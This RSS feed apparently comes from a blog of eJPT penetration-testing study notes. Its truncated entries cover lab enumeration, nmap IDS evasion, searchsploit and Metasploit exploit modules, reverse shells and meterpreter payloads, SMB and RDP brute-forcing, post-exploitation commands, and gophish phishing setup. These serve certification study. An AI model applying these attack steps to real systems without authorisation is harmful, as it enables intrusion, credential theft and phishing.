<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>ejpt on CTF Journey</title>
    <link>https://ctf-journey.github.io/tags/ejpt/</link>
    <description>Recent content in ejpt on CTF Journey</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <managingEditor>privacy_mini@gmail.com (GitHub Contributor Team)</managingEditor>
    <webMaster>privacy_mini@gmail.com (GitHub Contributor Team)</webMaster><atom:link href="https://ctf-journey.github.io/tags/ejpt/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Enumeration</title>
      <link>https://ctf-journey.github.io/notes/cert/ejpt-assesment-methodology/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>privacy_mini@gmail.com (GitHub Contributor Team)</author>
      <guid>https://ctf-journey.github.io/notes/cert/ejpt-assesment-methodology/</guid>
      <description>Information Gathering Passive: whois, whatweb, dnsrecon, wafw00f, sublist3r, google dorks, theharvester Active: dns zone transfer, nmap Footprinting &amp;amp; Scanning basic osi layer stuff networking nmap commands sn for ping sweep scan common ports first for faster results, like -P22,23,80,443,3389 Firewall detection &amp;amp; IDS evasion using malformed packets fragment packets with -f (MTU) optimising nmap with -T4 nmap output formats sometimes it makes sense to slow down scans, preventing IDS from detecting -D to set decoy ip addresses output -oN normal, -oX xml for metasploit, -oG grepable format Enumeration host discovery using the -sV option import nmap into msf using the db_import and db_nmap msf auxiliary modules using search steps to exploit nmap, scan services, check for msf exploits pivot to another subnet using msf enter shell, use ip addr to look for next subnet use run autoroute -s 192.</description>
    </item>
    
    <item>
      <title>Exam Review</title>
      <link>https://ctf-journey.github.io/notes/cert/ejpt-exam-review/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>privacy_mini@gmail.com (GitHub Contributor Team)</author>
      <guid>https://ctf-journey.github.io/notes/cert/ejpt-exam-review/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Exploitation</title>
      <link>https://ctf-journey.github.io/notes/cert/ejpt-exploitation-pentesting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>privacy_mini@gmail.com (GitHub Contributor Team)</author>
      <guid>https://ctf-journey.github.io/notes/cert/ejpt-exploitation-pentesting/</guid>
      <description>Exploitation banner grabber using nmap nmap -sV --script=banner 192.8.94.3 using netcat nc 192.8.94.3 22 vulnerability scanning with nmap find open ports nmap -sV -O 192.152.25.3 find cgi script in apache website, use nmap to check shellshock vulnerability nmap -sV -p 80 --script=http-shellshock --script-args &amp;quot;http-shellshock.uri=/gettime.cgi&amp;quot; 192.152.25.3 fixing exploits using searchsploit searchsploit HTTP File Server 2.3 download the exploit searchsploit -m 39161 modify the exploit to the correct local port and ip use the script to get a reverse shell netcat fundamentals netcat connect with open port nc 10.</description>
    </item>
    
    <item>
      <title>Metasploit</title>
      <link>https://ctf-journey.github.io/notes/cert/ejpt-metasploit-framework/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>privacy_mini@gmail.com (GitHub Contributor Team)</author>
      <guid>https://ctf-journey.github.io/notes/cert/ejpt-metasploit-framework/</guid>
      <description>Metasploit Framework (MSF) windows http file server use msf module exploit/windows/http/rejetto_hfs_exec windows java web server exploit the tomcat exploit/multi/http/tomcat_jsp_upload_bypass vulnerable ftp server vsftpd is backdoored exploit/unix/ftp/vsftpd_234_backdoor vulnerable file sharing service exploit the samba server exploit/linux/samba/is_known_pipename vulnerable ssh server msf module auxiliary/scanner/ssh/libssh_auth_bypass vulnerable smtp server haraka mail server exploit/linux/smtp/haraka, set SRVPORT 9898 email_to root@attackdefense.test payload linux/x64/meterpreter_reverse_http meterpreter basics check the php file and realise xdebug enabled, use exploit/unix/http/xdebug_unauth_exec available commands pwd ls lpwd lls edit cat download unzip rm checksum getenv PATH search -d /usr/bin -f *ckdo* lcd upload upgrading shells to meterpreter exploit samba again exploit/linux/samba/is_known_pipename to get shell, upgrade to meterpreter with post/multi/manage/shell_to_meterpreter windows post exploitation exploit hfs first to get shell exploit/windows/http/rejetto_hfs_exec post exploitation using post/windows/gather/win_privs post/windows/gather/enum_logged_on_users post/windows/gather/checkvm post/windows/gather/enum_applications post/windows/gather/enum_computers post/windows/gather/enum_shares uac bypass, msf memory injection exploit the hsf server exploit/windows/http/rejetto_hfs_exec, migrate to privileged process ps -S explorer.</description>
    </item>
    
    <item>
      <title>Network Pentest</title>
      <link>https://ctf-journey.github.io/notes/cert/ejpt-host-and-network-pentesting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>privacy_mini@gmail.com (GitHub Contributor Team)</author>
      <guid>https://ctf-journey.github.io/notes/cert/ejpt-host-and-network-pentesting/</guid>
      <description>System/Host Based Attacks webdav metasploit use dirb to find the dav directory dirb demo.ine.local use davtest tool davtest -url http://demo.ine.local/webdav login with davtest davtest -auth bob:password_123321 -url http://demo.ine.local/webdav msf module iis_webdav_upload_asp, set RHOSTS, HttpUsername, HttpPassword and PATH /webdav/metasploit%RAND%.asp smb server psexec msf module to bruteforce auxiliary/scanner/smb/smb_login, set USER_FILE PASS_FILE RHOSTS and VERBOSE msf module to gain access exploit/windows/smb/psexec, set RHOSTS SMBUser and SMBPass insecure rdp service use msf module auxiliary/scanner/rdp/rdp_scanner to detect rdp service use hydra bruteforce hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.</description>
    </item>
    
    <item>
      <title>Post Exploitation</title>
      <link>https://ctf-journey.github.io/notes/cert/ejpt-post-exploitation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>privacy_mini@gmail.com (GitHub Contributor Team)</author>
      <guid>https://ctf-journey.github.io/notes/cert/ejpt-post-exploitation/</guid>
      <description>Post-Exploitation enumerating windows system information scan nmap -sV demo.ine.local searchsploit searchsploit rejetto, exploit with use exploit/windows/http/rejetto_hfs_exec msf commands sysinfo shell hostname systeminfo detailed info about windows hotfix wmic qfe get Caption,Description,HotFixID,InstalledOn when finding out exact windows version enumerating windows users and groups msf commands getuid getprivs post exploit background use post/windows/gather/enum_logged_on_users set SESSION 1 check current permissions whoami /priv check users net users net user administrator check groups net localgroup net localgroup administrators enumerating windows network information cmd commands ipconfig ipconfig /all route print arp -a netstat -ano enumerating processes and services cmd commands ps pgrep explorer.</description>
    </item>
    
    <item>
      <title>Web Pentest</title>
      <link>https://ctf-journey.github.io/notes/cert/ejpt-webapp-pentesting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>privacy_mini@gmail.com (GitHub Contributor Team)</author>
      <guid>https://ctf-journey.github.io/notes/cert/ejpt-webapp-pentesting/</guid>
      <description>Social Engineering lets go phishing run the gophish.exe application enter the browser dashboard, create a new profile try importing a landing page try setting up an email template setting up users and groups monitor campaign Web &amp;amp; HTTP Protocol HTTP method enumeration curl -X GET/POST/DELETE/OPTIONS, OPTIONS will let you know what you can do curl -I is HEAD request dirb dirb http://demo.ine.local curl post request curl -X POST demo.ine.local/login.php -d &amp;quot;name=john&amp;amp;password=password&amp;quot; -v curl upload file curl demo.</description>
    </item>
    
  </channel>
</rss>
